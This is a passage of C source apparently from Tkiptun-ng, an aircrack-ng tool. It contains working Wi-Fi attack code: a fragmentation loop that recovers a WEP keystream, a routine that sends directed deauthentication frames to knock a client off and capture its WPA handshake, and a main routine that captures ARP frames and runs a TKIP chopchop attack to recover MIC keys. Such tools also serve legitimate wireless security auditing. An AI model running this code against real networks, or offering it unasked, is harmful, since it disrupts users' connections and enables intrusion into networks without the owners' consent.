                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen-z > 400-24 && caplen-z < 500-24)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    PCT; printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
                {
                    PCT; printf("Not enough acks, repeating...\n");
                    again = RETRY;
                    break;
                }

                if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                {
                    PCT; printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        PCT; printf("Still nothing, trying another packet...\n");
                        again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
        if (caplen-z == 416-24)
        {
            //Thats the ARP packet!
//             PCT; printf("Thats our ARP packet!\n");
        }
        if (caplen-z == 448-24)
        {
            //Thats the LLC NULL packet!
//             PCT; printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', 416);
        }

        memcpy(iv, packet+z, 4);
        memcpy(prga, packet+z+4, 384);
        xor_keystream(prga, h80211+24, 384);

        round = 0;
        again = RETRY;
        while(again == RETRY)
        {
            again = 0;

            PCT; printf("Trying to get 1500 bytes of a keystream\n");

            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);
            arplen=1500;
            if ((round % 2) == 1)
            {
                PCT; printf("Trying a LLC NULL packet\n");
                memset(h80211+24, '\x00', 1508);
                arplen+=32;
            }

            acksgot=0;
            packets=(arplen-24)/(300);
            if( (arplen-24)%(300) != 0 )
                packets++;

            send_fragments(h80211, arplen, iv, prga, 300, 0);
//            //Plus an ACK
//            send_packet(ack, 10);

            gettimeofday( &tv, NULL );

            gotit=0;
            while (!gotit)  //waiting for relayed packet
            {
                caplen = read_packet(packet, sizeof(packet), NULL);
                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
                if ( ( packet[0] & 0x80 ) == 0x80 ) /* QoS */
                    z+=2;

                if (packet[0] == 0xD4 )
                {
                    if (! memcmp(opt.r_smac, packet+4, 6)) //To our MAC
                        acksgot++;
                    continue;
                }

                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) ) //Is data frame && encrypted
                {
                    if ( (packet[1] & 2) )  //Is a FromDS packet with valid IV
                    {
                        if (! memcmp(opt.r_dmac, packet+4, 6)) //To our MAC
                        {
                            if (! memcmp(opt.r_smac, packet+16, 6)) //From our MAC
                            {
                                if (caplen-z > 1496-24)  //Is short enough
                                {
                                    //This is our relayed packet!
                                    PCT; printf("Got RELAYED packet!!\n");
                                    gotit = 1;
                                    isrelay = 1;
                                }
                            }
                        }
                    }
                }

                /* check if we got an deauthentication packet */

                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a deauthentication packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                /* check if we got an disassociation packet */

                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
                {
                    PCT; printf( "Got a disassociation packet!\n" );
                    read_sleep( 5*1000000 ); //sleep 5 seconds and ignore all frames in this period
                }

                gettimeofday( &tv2, NULL );
                if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (100*1000) && acksgot >0 && acksgot < packets  )//wait 100ms for acks
                {
                    PCT; printf("Not enough acks, repeating...\n");
                    again = RETRY;
                    break;
                }

                if (((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) > (1500*1000) && !gotit) //wait 1500ms for an answer
                {
                    PCT; printf("No answer, repeating...\n");
                    round++;
                    again = RETRY;
                    if (round > 10)
                    {
                        printf("Still nothing, quitting with 384 bytes? [y/n] \n");
                        fflush( stdout );
                        ret=0;
                        while(!ret) ret = scanf( "%s", tmpbuf );

                        printf( "\n" );

                        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
                            again = ABORT;
                        else
                            again = NEW_IV;
                    }
                    break;
                }
            }
        }

        if(again == NEW_IV) continue;

        if(again == ABORT) length = 408;
        else length = 1500;

        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
        if (caplen == length+8+z)
        {
            //Thats the ARP packet!
//             PCT; printf("Thats our ARP packet!\n");
        }
        if (caplen == length+16+z)
        {
            //Thats the LLC NULL packet!
//             PCT; printf("Thats our LLC Null packet!\n");
            memset(h80211+24, '\x00', length+8);
        }

        if(again != ABORT)
        {
            memcpy(iv, packet+z, 4);
            memcpy(prga, packet+z+4, length);
            xor_keystream(prga, h80211+24, length);
        }

        lt = localtime( (const time_t *) &tv.tv_sec );

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "fragment-%02d%02d-%02d%02d%02d.xor",
                  lt->tm_mon + 1, lt->tm_mday,
                  lt->tm_hour, lt->tm_min, lt->tm_sec );
        save_prga(strbuf, iv, prga, length);

        printf( "Saving keystream in %s\n", strbuf );
        printf("Now you can build a packet with packetforge-ng out of that %d bytes keystream\n", length);

        done=1;

    }

    return( 0 );
}

static int get_ip_port(char *iface, char *ip, const int ip_size)
{
	char *host;
	char *ptr;
	int port = -1;
	struct in_addr addr;

	host = strdup(iface);
	if (!host)
		return -1;

	ptr = strchr(host, ':');
	if (!ptr)
		goto out;

	*ptr++ = 0;

	if (!inet_aton(host, (struct in_addr *)&addr))
		goto out; /* XXX resolve hostname */

	if(strlen(host) > 15)
        {
            port = -1;
            goto out;
        }
	strncpy(ip, host, ip_size);
	port = atoi(ptr);
        if(port <= 0) port = -1;

out:
	free(host);
	return port;
}

int getHDSK()
{
    int i, n;
    int aacks, sacks, caplen;
    struct timeval tv;
    fd_set rfds;

    n = 0;

//         usleep( 180000 );

        /* deauthenticate the target */

        memcpy( h80211, DEAUTH_REQ, 26 );
        memcpy( h80211 + 16, opt.r_bssid, 6 );

        aacks = 0;
        sacks = 0;
        for( i = 0; i < 4; i++ )
        {
            if(i == 0)
            {
                PCT; printf( "Sending 4 directed DeAuth. STMAC:"
                            " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
                            opt.wpa.stmac[0],  opt.wpa.stmac[1],
                            opt.wpa.stmac[2],  opt.wpa.stmac[3],
                            opt.wpa.stmac[4],  opt.wpa.stmac[5],
                            sacks, aacks );
            }

            memcpy( h80211 +  4, opt.wpa.stmac,  6 );
            memcpy( h80211 + 10, opt.r_bssid, 6 );

            if( send_packet( h80211, 26 ) < 0 )
                return( 1 );

            usleep( 2000 );

            memcpy( h80211 +  4, opt.r_bssid, 6 );
            memcpy( h80211 + 10, opt.wpa.stmac,  6 );

            if( send_packet( h80211, 26 ) < 0 )
                return( 1 );

            usleep( 100000 );

            while( 1 )
            {
                FD_ZERO( &rfds );
                FD_SET( dev.fd_in, &rfds );

                tv.tv_sec  = 0;
                tv.tv_usec = 1000;

                if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
                {
                    if( errno == EINTR ) continue;
                    perror( "select failed" );
                    return( 1 );
                }

                if( ! FD_ISSET( dev.fd_in, &rfds ) )
                    break;

                caplen = read_packet( h80211, sizeof( h80211 ), NULL );

                check_received(h80211, caplen);

                if(caplen <= 0 ) break;
                if(caplen != 10) continue;
                if( h80211[0] == 0xD4)
                {
                    if( memcmp(h80211+4, opt.wpa.stmac, 6) == 0 )
                    {
                        aacks++;
                    }
                    if( memcmp(h80211+4, opt.r_bssid, 6) == 0 )
                    {
                        sacks++;
                    }
                    PCT; printf( "Sending 4 directed DeAuth. STMAC:"
                                " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
                                opt.wpa.stmac[0],  opt.wpa.stmac[1],
                                opt.wpa.stmac[2],  opt.wpa.stmac[3],
                                opt.wpa.stmac[4],  opt.wpa.stmac[5],
                                sacks, aacks );
                }
            }
        }
        printf("\n");

    return( 0 );
}

int main( int argc, char *argv[] )
{
    int i, j, n, ret, got_hdsk;
    char *s, buf[128];
    int caplen=0;
    unsigned char packet1[4096];
    unsigned char packet2[4096];
    int packet1_len, packet2_len;
    struct timeval mic_fail;

    #ifdef USE_GCRYPT
        // Disable secure memory.
        gcry_control (GCRYCTL_DISABLE_SECMEM, 0);
        // Tell Libgcrypt that initialization has completed.
        gcry_control (GCRYCTL_INITIALIZATION_FINISHED, 0);
    #endif

    /* check the arguments */

    memset( &opt, 0, sizeof( opt ) );
    memset( &dev, 0, sizeof( dev ) );

    opt.f_type    = -1; opt.f_subtype   = -1;
    opt.f_minlen  = 80; opt.f_maxlen    = 80;
    opt.f_minlen_set = 0;
    opt.f_maxlen_set = 0;
    opt.f_tods    = -1; opt.f_fromds    = -1;
    opt.f_iswep   = -1; opt.ringbuffer  =  8;

    opt.a_mode    = -1; opt.r_fctrl     = -1;
    opt.ghost     =  0; opt.npackets    = -1;
    opt.delay     = 15; opt.bittest     =  0;
    opt.fast      = -1; opt.r_smac_set  =  0;
    opt.npackets  =  1; opt.nodetect    =  0;
    opt.mic_failure_interval = DEFAULT_MIC_FAILURE_INTERVAL;

/* XXX */
#if 0
#if defined(__FreeBSD__)
    /*
        check what is our FreeBSD version. injection works
        only on 7-CURRENT so abort if it's a lower version.
    */
    if( __FreeBSD_version < 700000 )
    {
        fprintf( stderr, "Aireplay-ng does not work on this "
            "release of FreeBSD.\n" );
        exit( 1 );
    }
#endif
#endif

    while( 1 )
    {
        int option_index = 0;

        static struct option long_options[] = {
            {"help",        0, 0, 'H'},
            {"pmk",         1, 0, 'P'},
            {"psk",         1, 0, 'p'},
            {0,             0, 0,  0 }
        };

        int option = getopt_long( argc, argv,
                        "d:s:m:n:t:f:x:a:c:h:e:jy:i:r:HZDK:P:p:M:",
                        long_options, &option_index );

        if( option < 0 ) break;

        switch( option )
        {
            case 0 :

                break;

            case ':' :

                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );

            case '?' :

                printf("\"%s --help\" for help.\n", argv[0]);
                return( 1 );

            case 'd' :

                if( getmac( optarg, 1, opt.f_dmac ) != 0 )
                {
                    printf( "Invalid destination MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 's' :

                if( getmac( optarg, 1, opt.f_smac ) != 0 )
                {
                    printf( "Invalid source MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'm' :

                ret = sscanf( optarg, "%d", &opt.f_minlen );
                if( opt.f_minlen < 0 || ret != 1 )
                {
                    printf( "Invalid minimum length filter. [>=0]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.f_minlen_set=1;
                break;

            case 'n' :

                ret = sscanf( optarg, "%d", &opt.f_maxlen );
                if( opt.f_maxlen < 0 || ret != 1 )
                {
                    printf( "Invalid maximum length filter. [>=0]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.f_maxlen_set=1;
                break;

            case 't' :

                ret = sscanf( optarg, "%d", &opt.f_tods );
                if(( opt.f_tods != 0 && opt.f_tods != 1 ) || ret != 1 )
                {
                    printf( "Invalid tods filter. [0,1]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'f' :

                ret = sscanf( optarg, "%d", &opt.f_fromds );
                if(( opt.f_fromds != 0 && opt.f_fromds != 1 ) || ret != 1 )
                {
                    printf( "Invalid fromds filter. [0,1]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'x' :

                ret = sscanf( optarg, "%d", &opt.r_nbpps );
                if( opt.r_nbpps < 1 || opt.r_nbpps > 1024 || ret != 1 )
                {
                    printf( "Invalid number of packets per second. [1-1024]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'a' :

                if( getmac( optarg, 1, opt.r_bssid ) != 0 )
                {
                    printf( "Invalid AP MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                if( getmac( optarg, 1, opt.f_bssid ) != 0 )
                {
                    printf( "Invalid AP MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'c' :

                if( getmac( optarg, 1, opt.r_dmac ) != 0 )
                {
                    printf( "Invalid destination MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            case 'h' :

                if( getmac( optarg, 1, opt.r_smac ) != 0 )
                {
                    printf( "Invalid source MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                if( getmac( optarg, 1, opt.wpa.stmac ) != 0 )
                {
                    printf( "Invalid source MAC address.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.r_smac_set=1;
                break;

            case 'e' :

                memset(  opt.r_essid, 0, sizeof( opt.r_essid ) );
                strncpy( opt.r_essid, optarg, sizeof( opt.r_essid )  - 1 );
                break;

            case 'j' :

                opt.r_fromdsinj = 1;
                break;

            case 'D' :

                opt.nodetect = 1;
                break;

            case 'y' :

                if( opt.prga != NULL )
                {
                    printf( "PRGA file already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                if( read_prga(&(opt.prga), optarg) != 0 )
                {
                    return( 1 );
                }
                break;

            case 'i' :

                if( opt.s_face != NULL || opt.s_file )
                {
                    printf( "Packet source already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.s_face = optarg;
                opt.port_in = get_ip_port(opt.s_face, opt.ip_in, sizeof(opt.ip_in)-1);
                break;

            case 'r' :

                if( opt.s_face != NULL || opt.s_file )
                {
                    printf( "Packet source already specified.\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                opt.s_file = optarg;
                break;

            case 'Z' :

                opt.fast = 0;
                break;

            case 'H' :

                printf( usage, getVersion("Tkiptun-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );
                return( 1 );

            case 'K' :

                i = 0 ;
                n = 0;
                s = optarg;
                while( s[i] != '\0' )
                {
                        if ( s[i] == '-' ||  s[i] == ':' || s[i] == ' ')
                                i++;
                        else
                                s[n++] = s[i++];
                }
                s[n] = '\0' ;
                buf[0] = s[0];
                buf[1] = s[1];
                buf[2] = '\0';
                i = 0;
                j = 0;
                while( sscanf( buf, "%x", &n ) == 1 )
                {
                    if ( n < 0 || n > 255 )
                    {
                        printf( "Invalid keystream.\n" );
                        printf("\"%s --help\" for help.\n", argv[0]);
                        return( 1 );
                    }
                    opt.oldkeystream[opt.oldkeystreamlen] = n ;
                    opt.oldkeystreamlen++;
                    if( i >= 64 ) break;
                    s += 2;
                    buf[0] = s[0];
                    buf[1] = s[1];
                }
                break;

            case 'P' :

                memset(  opt.pmk, 0, sizeof( opt.pmk ) );
                i = hexStringToArray(optarg, strlen(optarg), opt.pmk, 128);
                if (i == -1)
                {
                	printf("Invalid value. It requires 128 bytes of PMK in hexadecimal.\n");
                	return( 1 );
                }
                opt.got_pmk = 1;
                break;

            case 'p' :

                memset(  opt.psk, 0, sizeof( opt.psk ) );
                if( strlen(optarg) < 8 || strlen(optarg) > 63)
                {
                    printf("PSK with invalid length specified [8-64].\n");
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                strncpy( opt.psk, optarg, sizeof( opt.psk )  - 1 );
                opt.got_psk = 1;
                break;

            case 'M' :

                ret = sscanf( optarg, "%d", &opt.mic_failure_interval );
                if( ret != 1 || opt.mic_failure_interval < 0 )
                {
                    printf( "Invalid MIC error timeout. [>=0]\n" );
                    printf("\"%s --help\" for help.\n", argv[0]);
                    return( 1 );
                }
                break;

            default : goto usage;
        }
    }

    if( argc - optind != 1 )
    {
    	if(argc == 1)
    	{
usage:
	        printf( usage, getVersion("Tkiptun-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC)  );
        }
	    if( argc - optind == 0)
	    {
	    	printf("No replay interface specified.\n");
	    }
	    if(argc > 1)
	    {
    		printf("\"%s --help\" for help.\n", argv[0]);
	    }
        return( 1 );
    }

    if( !opt.r_smac_set )
    {
        printf( "A Client MAC must be specified (-h).\n");
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

    if( (opt.f_minlen > 0 && opt.f_maxlen > 0) && opt.f_minlen > opt.f_maxlen )
    {
        printf( "Invalid length filter (min(-m):%d > max(-n):%d).\n",
                opt.f_minlen, opt.f_maxlen );
        printf("\"%s --help\" for help.\n", argv[0]);
        return( 1 );
    }

    if ( opt.f_tods == 1 && opt.f_fromds == 1 )
    {
        printf( "FromDS and ToDS bit are set: packet has to come from the AP and go to the AP\n" );
    }

    dev.fd_rtc = -1;

    /* open the RTC device if necessary */

#if defined(__i386__)
#if defined(linux)
    if( ( dev.fd_rtc = open( "/dev/rtc0", O_RDONLY ) ) < 0 )
    {
        dev.fd_rtc = 0;
    }

    if( (dev.fd_rtc == 0) && ( ( dev.fd_rtc = open( "/dev/rtc", O_RDONLY ) ) < 0 ) )
    {
        dev.fd_rtc = 0;
    }

    if(dev.fd_rtc > 0)
    {
        if( ioctl( dev.fd_rtc, RTC_IRQP_SET, RTC_RESOLUTION ) < 0 )
        {
            perror( "ioctl(RTC_IRQP_SET) failed" );
            printf(
"Make sure enhanced rtc device support is enabled in the kernel (module\n"
"rtc, not genrtc) - also try 'echo 1024 >/proc/sys/dev/rtc/max-user-freq'.\n" );
            close( dev.fd_rtc );
            dev.fd_rtc = -1;
        }
        else
        {
            if( ioctl( dev.fd_rtc, RTC_PIE_ON, 0 ) < 0 )
            {
                perror( "ioctl(RTC_PIE_ON) failed" );
                close( dev.fd_rtc );
                dev.fd_rtc = -1;
            }
        }
    }
    else
    {
        printf( "For information, no action required:"
                " Using gettimeofday() instead of /dev/rtc\n" );
        dev.fd_rtc = -1;
    }
#endif /* linux */
#endif /* i386 */

    opt.iface_out = argv[optind];
    opt.port_out = get_ip_port(opt.iface_out, opt.ip_out, sizeof(opt.ip_out)-1);

    //don't open interface(s) when using test mode and airserv
    if( ! (opt.a_mode == 9 && opt.port_out >= 0 ) )
    {
        /* open the replay interface */
        _wi_out = wi_open(opt.iface_out);
        if (!_wi_out)
            return 1;
        dev.fd_out = wi_fd(_wi_out);

        /* open the packet source */
        if( opt.s_face != NULL )
        {
            //don't open interface(s) when using test mode and airserv
            if( ! (opt.a_mode == 9 && opt.port_in >= 0 ) )
            {
                _wi_in = wi_open(opt.s_face);
                if (!_wi_in)
                    return 1;
                dev.fd_in = wi_fd(_wi_in);
                wi_get_mac(_wi_in, dev.mac_in);
            }
        }
        else
        {
            _wi_in = _wi_out;
            dev.fd_in = dev.fd_out;

            /* XXX */
            dev.arptype_in = dev.arptype_out;
            wi_get_mac(_wi_in, dev.mac_in);
        }

        wi_get_mac(_wi_out, dev.mac_out);
    }

    /* drop privileges */
    if (setuid( getuid() ) == -1) {
	perror("setuid");
    }

    /* XXX */
    if( opt.r_nbpps == 0 )
    {
        opt.r_nbpps = 10;
    }


    if( opt.s_file != NULL )
    {
        if( ! ( dev.f_cap_in = fopen( opt.s_file, "rb" ) ) )
        {
            perror( "open failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )
        {
            perror( "fread(pcap file header) failed" );
            return( 1 );
        }

        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&
            dev.pfh_in.magic != TCPDUMP_CIGAM )
        {
            fprintf( stderr, "\"%s\" isn't a pcap file (expected "
                             "TCPDUMP_MAGIC).\n", opt.s_file );
            return( 1 );
        }

        if( dev.pfh_in.magic == TCPDUMP_CIGAM )
            SWAP32(dev.pfh_in.linktype);

        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&
            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER &&
            dev.pfh_in.linktype != LINKTYPE_RADIOTAP_HDR &&
            dev.pfh_in.linktype != LINKTYPE_PPI_HDR )
        {
            fprintf( stderr, "Wrong linktype from pcap file header "
                             "(expected LINKTYPE_IEEE802_11) -\n"
                             "this doesn't look like a regular 802.11 "
                             "capture.\n" );
            return( 1 );
        }
    }

    //if there is no -h given, use default hardware mac
    if( maccmp( opt.r_smac, NULL_MAC) == 0 )
    {
        memcpy( opt.r_smac, dev.mac_out, 6);
        if(opt.a_mode != 0 && opt.a_mode != 4 && opt.a_mode != 9)
        {
            printf("No source MAC (-h) specified. Using the device MAC (%02X:%02X:%02X:%02X:%02X:%02X)\n",
                    dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5]);
        }
    }

    if( maccmp( opt.r_smac, dev.mac_out) != 0 && maccmp( opt.r_smac, NULL_MAC) != 0)
    {
//        if( dev.is_madwifi && opt.a_mode == 5 ) printf("For --fragment to work on madwifi[-ng], set the interface MAC according to (-h)!\n");
        fprintf( stderr, "The interface MAC (%02X:%02X:%02X:%02X:%02X:%02X)"
                 " doesn't match the specified MAC (-h).\n"
                 "\tifconfig %s hw ether %02X:%02X:%02X:%02X:%02X:%02X\n",
                 dev.mac_out[0], dev.mac_out[1], dev.mac_out[2], dev.mac_out[3], dev.mac_out[4], dev.mac_out[5],
                 opt.iface_out, opt.r_smac[0], opt.r_smac[1], opt.r_smac[2], opt.r_smac[3], opt.r_smac[4], opt.r_smac[5] );
    }

    /* DO MICHAEL TEST */

    memset(buf, 0, 128);
    memcpy(buf, "M", 1);
    i = michael_test((unsigned char*)"\x82\x92\x5c\x1c\xa1\xd1\x30\xb8", (unsigned char*)buf, strlen(buf), (unsigned char*)"\x43\x47\x21\xca\x40\x63\x9b\x3f");
    PCT; printf("Michael Test: %s\n", i ? "Successful" : "Failed");

    /* END MICHAEL TEST*/

    if(getnet(NULL, 0, 0) != 0)
        return 1;

    PCT; printf("Found specified AP\n");

    got_hdsk=0;
    while(1)
    {
        getHDSK();
        for(i=0; i<10; i++)
        {
            read_sleep(500000);
            if(opt.wpa.state == 7)
            {
                got_hdsk = 1;
                break;
            }
        }
        if(got_hdsk)
            break;
    }

    if(!opt.got_pmk && opt.got_psk && strlen(opt.r_essid) > 1)
    {
        calc_pmk(opt.psk, opt.r_essid, opt.pmk);
        PCT; printf("PSK: %s\n", opt.psk);
        PCT; printf("PMK: ");
        for(i=0; i<31; i++)
            printf("%02X:", opt.pmk[i]);
        printf("%02X\n", opt.pmk[31]);
        opt.got_pmk = 1;
    }

    if(opt.got_pmk)
    {
        opt.wpa_sta.next = NULL;
        memcpy(opt.wpa_sta.stmac, opt.r_smac, 6);
        memcpy(opt.wpa_sta.bssid, opt.f_bssid, 6);
        memcpy(opt.wpa_sta.snonce, opt.wpa.snonce, 32);
        memcpy(opt.wpa_sta.anonce, opt.wpa.anonce, 32);
        memcpy(opt.wpa_sta.keymic, opt.wpa.keymic, 20);
        memcpy(opt.wpa_sta.eapol, opt.wpa.eapol, 256);
        opt.wpa_sta.eapol_size = opt.wpa.eapol_size;
        opt.wpa_sta.keyver = opt.wpa.keyver;
        opt.wpa_sta.valid_ptk = calc_ptk( &opt.wpa_sta, opt.pmk );
        PCT; printf("PTK: ");
        for(i=0; i<79; i++)
            printf("%02X:", opt.wpa_sta.ptk[i]);
        printf("%02X\n", opt.wpa_sta.ptk[79]);
        PCT; printf("Valid PTK: %s\n", (opt.wpa_sta.valid_ptk) ? "Yes" : "No!" );
        if(opt.wpa_sta.valid_ptk)
            opt.got_ptk = 1;

        PCT; printf("KCK: ");
        for(i=0; i<15; i++)
            printf("%02X:", opt.wpa_sta.ptk[i]);
        printf("%02X\n", opt.wpa_sta.ptk[15]);

        PCT; printf("KEK: ");
        for(i=16; i<31; i++)
            printf("%02X:", opt.wpa_sta.ptk[i]);
        printf("%02X\n", opt.wpa_sta.ptk[31]);

        PCT; printf("Temporal Encryption Key (TK1): ");
        for(i=32; i<47; i++)
            printf("%02X:", opt.wpa_sta.ptk[i]);
        printf("%02X\n", opt.wpa_sta.ptk[47]);

        PCT; printf("Michael Key (FromDS): ");
        for(i=48; i<55; i++)
            printf("%02X:", opt.wpa_sta.ptk[i]);
        printf("%02X\n", opt.wpa_sta.ptk[55]);

        PCT; printf("Michael Key (ToDS): ");
        for(i=56; i<63; i++)
            printf("%02X:", opt.wpa_sta.ptk[i]);
        printf("%02X\n", opt.wpa_sta.ptk[63]);
    }

    /* Select ToDS ARP from Client */

    PCT; printf("Waiting for an ARP packet coming from the Client...\n");

    opt.f_tods = 1;
    opt.f_fromds = 0;
    memcpy(opt.f_smac, opt.r_smac, 6);
//    memcpy(opt.f_dmac, opt.f_bssid, 6);
    if(opt.fast == -1)
        opt.fast = 1;

    if(opt.f_minlen_set == 0) {
        opt.f_minlen = 80;
    }
    if(opt.f_maxlen_set == 0) {
        opt.f_maxlen = 80;
    }

    while(1)
    {
        if( capture_ask_packet( &caplen, 0 ) != 0 )
            return( 1 );
        if( is_qos_arp_tkip(h80211, caplen) == 1 )
            break;
    }

    memcpy(packet2, h80211, caplen);
    packet2_len = caplen;

    /* Select FromDS ARP to Client */

    PCT; printf("Waiting for an ARP response packet coming from the AP...\n");

    opt.f_tods = 0;
    opt.f_fromds = 1;
    memcpy(opt.f_dmac, opt.r_smac, 6);
    memcpy(opt.f_smac, NULL_MAC, 6);

    if(opt.f_minlen_set == 0) {
        opt.f_minlen = 80;
    }
    if(opt.f_maxlen_set == 0) {
        opt.f_maxlen = 98;
    }

    while(1)
    {
        if( capture_ask_packet( &caplen, 0 ) != 0 )
            return( 1 );
        if( is_qos_arp_tkip(h80211, caplen) == 1 )
            break;
    }

    memcpy(packet1, h80211, caplen);
    packet1_len = caplen;


    PCT; printf("Got the answer!\n");

    PCT; printf("Waiting 10 seconds to let encrypted EAPOL frames pass without interfering.\n");
    read_sleep(10*1000000);

    memcpy(h80211, packet1, packet1_len);

    /* Chop the packet down, get a keystream+plaintext, calculate the MIC Key */

    if (do_attack_tkipchop(h80211, caplen) == 1)
	return( 1 );

    /* derive IPs and MACs; relays on QoS, ARP and fromDS packet */
    if(opt.chopped_from_plain != NULL)
    {
        memcpy(opt.ip_cli, opt.chopped_from_plain+58, 4);
        memcpy(opt.ip_ap, opt.chopped_from_plain+48, 4);
        memcpy(opt.r_apmac, opt.chopped_from_plain+42, 6);
    }

    PCT; printf("AP MAC: %02X:%02X:%02X:%02X:%02X:%02X IP: %i.%i.%i.%i\n",
                opt.r_apmac[0],opt.r_apmac[1],opt.r_apmac[2],opt.r_apmac[3],opt.r_apmac[4],opt.r_apmac[5],
                opt.ip_ap[0],opt.ip_ap[1],opt.ip_ap[2],opt.ip_ap[3]);
    PCT; printf("Client MAC: %02X:%02X:%02X:%02X:%02X:%02X IP: %i.%i.%i.%i\n",
                opt.r_smac[0],opt.r_smac[1],opt.r_smac[2],opt.r_smac[3],opt.r_smac[4],opt.r_smac[5],
                opt.ip_cli[0],opt.ip_cli[1],opt.ip_cli[2],opt.ip_cli[3]);

    /* Send an ARP Request from the AP to the Client */

    build_arp_request(h80211, &caplen, 0); //writes encrypted tkip arp request into h80211
    send_packet(h80211, caplen);
    PCT; printf("Sent encrypted tkip ARP request to the client.\n");

    /* wait until we can generate a new mic failure */

    PCT; printf("Wait for the mic countermeasure timeout of %i seconds.\n", opt.mic_failure_interval);

    while(1)
    {
        gettimeofday(&mic_fail, NULL);
        if( (mic_fail.tv_sec - opt.last_mic_failure.tv_sec) * 1000000UL + (mic_fail.tv_usec - opt.last_mic_failure.tv_usec) > opt.mic_failure_interval * 1000000UL)
            break;
        sleep(1);
    }

    /* Also chop the answer to get the equivalent MIC Key */
    memcpy(h80211, packet2, packet2_len);
    do_attack_tkipchop(h80211, caplen);

    /* that's all, folks */

    return( 0 );
}
